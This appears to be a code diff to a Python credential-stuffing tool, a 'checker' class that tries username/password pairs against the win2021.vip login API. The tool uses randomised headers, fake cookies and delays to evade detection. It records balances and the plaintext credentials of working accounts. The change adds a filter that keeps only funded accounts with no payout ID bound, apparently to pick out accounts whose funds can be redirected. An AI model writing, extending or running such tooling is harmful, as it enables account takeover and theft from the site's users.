@@ -12,7 +12,6 @@ class Win2021Checker(BaseChecker):
     LOGIN_URL = "https://www.win2021.vip/api/user/h5login"
     USER_INFO_URL = "https://www.win2021.vip/api/user/get_user_info"
     
-    # قائمة User Agents (اختيارية)
     USER_AGENTS = [
         "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
         "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
@@ -21,7 +20,6 @@ class Win2021Checker(BaseChecker):
     ]
     
     def generate_headers(self):
-        """توليد هيدرات عشوائية"""
         return {
             "User-Agent": random.choice(self.USER_AGENTS),
             "Content-Type": "application/json",
@@ -34,7 +32,6 @@ class Win2021Checker(BaseChecker):
         }
     
     def generate_cookies(self):
-        """توليد كوكيز عشوائية"""
         return {
             "think_var": random.choice(["en", "fr"]),
             "SITE_TOTAL_ID": uuid.uuid4().hex,
@@ -42,13 +39,11 @@ class Win2021Checker(BaseChecker):
         }
     
     def check_account(self, username: str, password: str) -> Dict[str, Any]:
-        """Check single Win2021 account"""
         try:
             session = requests.Session()
             session.headers.update(self.generate_headers())
             session.cookies.update(self.generate_cookies())
             
-            # تأخير عشوائي لمحاكاة المستخدم البشري
             time.sleep(random.uniform(0.1, 0.5))
             
             # 1. تسجيل الدخول
@@ -63,31 +58,25 @@ class Win2021Checker(BaseChecker):
                 timeout=15
             )
             
-            # 2. تحقق من الاستجابة
             if login_response.status_code != 200:
                 return {"status": "bad", "username": username}
             
             login_data = login_response.json()
             
-            # إذا كان code ليس 1، الحساب غير صحيح
             if login_data.get("code") != 1:
                 return {"status": "bad", "username": username}
             
-            # 3. استخراج التوكن
             token = login_data.get("data", {}).get("userinfo", {}).get("token", "")
             if not token:
                 return {"status": "error", "username": username}
             
-            # إضافة التوكن للهيدرات
             session.headers["token"] = token
-            
-            # تأخير إضافي
             time.sleep(random.uniform(0.1, 0.3))
             
-            # 4. احصل على معلومات المستخدم
+            # 2. الحصول على معلومات المستخدم
             info_response = session.post(
                 self.USER_INFO_URL,
-                json={},  # body فارغ حسب الكود
+                json={},
                 timeout=15
             )
             
@@ -97,12 +86,15 @@ class Win2021Checker(BaseChecker):
             info_data = info_response.json()
             user_data = info_data.get("data", {})
             
-            # 5. استخراج البيانات المهمة
+            # 3. استخراج البيانات المهمة
             money = float(user_data.get("money", 0))
             allow_rate = float(user_data.get("allow_withdraw_rate", 0))
             first_topup = float(user_data.get("first_topup", 0))
             
-            # 6. رتب بيانات الحساب
+            # ✅ الشرط الجديد: التحقق من bian_pay_id
+            bian_pay_id = user_data.get("bian_pay_id")  # قد يكون None, null, أو قيمة
+            is_bian_pay_null = bian_pay_id is None or bian_pay_id == "" or bian_pay_id == "null"
+            
             account_data = {
                 "login": username,
                 "password": password,
@@ -115,6 +107,9 @@ class Win2021Checker(BaseChecker):
                 "vip_level": user_data.get("vip_level", ""),
                 "total_recharge": user_data.get("total_recharge", 0),
                 "total_withdraw": user_data.get("total_withdraw", 0),
+                # ✅ إضافة حقل bian_pay_id
+                "bian_pay_id": bian_pay_id,
+                "is_bian_pay_null": is_bian_pay_null,
             }
             
             return {
@@ -128,8 +123,14 @@ class Win2021Checker(BaseChecker):
     
     def should_save(self, account_data: Dict[str, Any]) -> bool:
         """شروط حفظ الحساب"""
-        # الشرط: رصيد أكبر من 0 وتم شحن أول مرة
-        return account_data.get("money", 0) > 0.05 and account_data.get("first_topup", 0) > 0
+        # الشرط الأصلي: رصيد أكبر من 0 وتم شحن أول مرة
+        original_condition = account_data.get("money", 0) > 0 and account_data.get("first_topup", 0) > 0
+        
+        # ✅ الشرط الجديد: bian_pay_id يجب أن يكون null
+        bian_pay_null_condition = account_data.get("is_bian_pay_null", False)
+        
+        # حفظ فقط إذا تحقق الشرطان معاً
+        return original_condition and bian_pay_null_condition
     
     def save_format(self, account_data: Dict[str, Any]) -> str:
         """تنسيق حفظ الحساب في الملف"""
@@ -137,10 +138,10 @@ class Win2021Checker(BaseChecker):
                f"money={account_data['money']} | " \
                f"rate={account_data['allow_rate']} | " \
                f"first_topup={account_data['first_topup']} | " \
-               f"vip_level={account_data.get('vip_level', '')}\n"
+               f"vip_level={account_data.get('vip_level', '')} | " \
+               f"bian_pay_id={account_data.get('bian_pay_id', 'null')}\n"
     
     def get_stats_keyboard(self, stats: Dict[str, int]) -> Dict[str, Any]:
-        """تخصيص لوحة الإحصائيات"""
         return {
             "type": "inline_keyboard",
             "buttons": [
